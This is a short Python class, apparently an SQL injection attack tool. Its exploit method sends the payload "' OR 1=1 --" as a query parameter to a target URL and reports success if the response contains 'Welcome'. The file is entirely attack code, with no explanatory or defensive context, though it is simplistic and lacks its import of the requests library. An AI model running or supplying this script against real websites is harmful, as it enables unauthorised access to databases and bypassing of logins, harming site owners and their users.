class SQLInjection:
    def __init__(self, target_url):
        self.target_url = target_url

    def exploit(self):
        payload = "' OR 1=1 --"
        response = requests.get(self.target_url, params={"q": payload})
        if "Welcome" in response.text:
            return "SQL Injection successful"
        return "SQL Injection failed"
